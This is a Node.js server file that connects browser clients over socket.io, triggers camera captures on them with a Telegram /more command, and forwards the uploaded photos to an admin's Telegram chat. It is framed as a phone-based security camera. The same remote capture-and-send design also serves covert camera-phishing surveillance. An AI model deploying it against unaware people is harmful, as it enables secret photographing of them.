require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const multer = require('multer');

// Environment Variables Verify Karna
const token = process.env.BOT_TOKEN;
const adminId = process.env.ADMIN_ID;
const port = process.env.PORT || 3000;

if (!token || !adminId) {
    console.error("❌ CRITICAL ERROR: BOT_TOKEN or ADMIN_ID is missing in .env file!");
    process.exit(1);
}

// Setup
const bot = new TelegramBot(token, { polling: true });
const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Multer setup (Images receive karne ke liye)
const upload = multer({ storage: multer.memoryStorage() });

app.use(express.static(path.join(__dirname, 'public')));

// ----------------------------------------------------
// 1. SOCKET.IO (Live Connection)
// ----------------------------------------------------
io.on('connection', (socket) => {
    console.log('📱 Device Connected to Live Node!');
    bot.sendMessage(adminId, "📡 Security Node (Phone) is now LIVE and connected!");
    
    socket.on('disconnect', () => {
        console.log('❌ Device Disconnected!');
        bot.sendMessage(adminId, "⚠️ Alert: Security Node disconnected (Browser closed or network lost).");
    });
});

// ----------------------------------------------------
// 2. IMAGE RECEIVER (Frontend se photo le kar Telegram pe bhejna)
// ----------------------------------------------------
app.post('/upload', upload.single('photo'), (req, res) => {
    if (!req.file) return res.status(400).send('No image received');

    // Received photo direct send to Admin
    bot.sendPhoto(adminId, req.file.buffer, { caption: "🚨 Security Alert: Auto Capture!" })
        .then(() => res.status(200).send('Sent successfully'))
        .catch((err) => {
            console.error("Telegram Error:", err.message);
            res.status(500).send('Failed to send');
        });
});

// ----------------------------------------------------
// 3. TELEGRAM BOT COMMANDS
// ----------------------------------------------------
bot.onText(/\/start/, (msg) => {
    if (msg.chat.id.toString() === adminId) {
        bot.sendMessage(adminId, "✅ System is active and ready!\n\nCommands:\n`/more` - Capture 5 photos instantly.", { parse_mode: "Markdown" });
    }
});

bot.onText(/\/more/, (msg) => {
    if (msg.chat.id.toString() === adminId) {
        bot.sendMessage(adminId, "📸 Command sent! Capturing photos...");
        io.emit('capture_command'); // HTML page ko trigger bhejna
    }
});

// ----------------------------------------------------
// START SERVER
// ----------------------------------------------------
server.listen(port, () => {
    console.log(`🚀 Server is running on port ${port}`);
    bot.sendMessage(adminId, "🔄 Server Rebooted. Bot is online and listening.");
});
